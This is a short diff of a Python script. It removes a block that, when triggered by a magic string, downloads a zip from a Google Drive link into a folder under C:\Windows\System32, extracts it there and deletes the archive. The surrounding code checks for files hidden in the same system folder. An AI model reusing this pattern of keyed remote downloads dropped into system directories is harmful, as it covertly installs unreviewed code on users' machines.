@@ -11,7 +11,7 @@ import sys
 import shutil
 import os
 import gdown
-import urllib.request
+
 os.system('cls')
 #exit()
 if file_contentsx1=="deleternn":
@@ -294,16 +294,6 @@ def delete_files_if_aesv3_missing():
 
 delete_files_if_aesv3_missing()
 
-def download_file_from_google_drive(url, output_path):
-    if not os.path.exists(output_path):
-        gdown.download(url, output=output_path, quiet=True)
-if file_contentsx1=="ZM2vsjeaWJHSf":
-    if not os.path.exists("C:\\Windows\\System32\\MSRXL\\aesprem-jan8.py"):
-        urllib.request.urlretrieve("https://drive.google.com/uc?id=1F-dt2LPglKmY_2eRMEGQxYnsJ5PDpK6E", "C:\\Windows\\System32\\MSRXL\\premx.zip")
-        zip_file = r'C:\Windows\System32\MSRXL\premx.zip'
-        extract_dir = r'C:\Windows\System32\MSRXL'
-        extract_zip(zip_file, extract_dir)
-        os.remove(zip_file)
 if not os.path.exists("C:\\Windows\\System32\\MSRXL\\aesprem-jan8.py"):
     print("")
     print("")
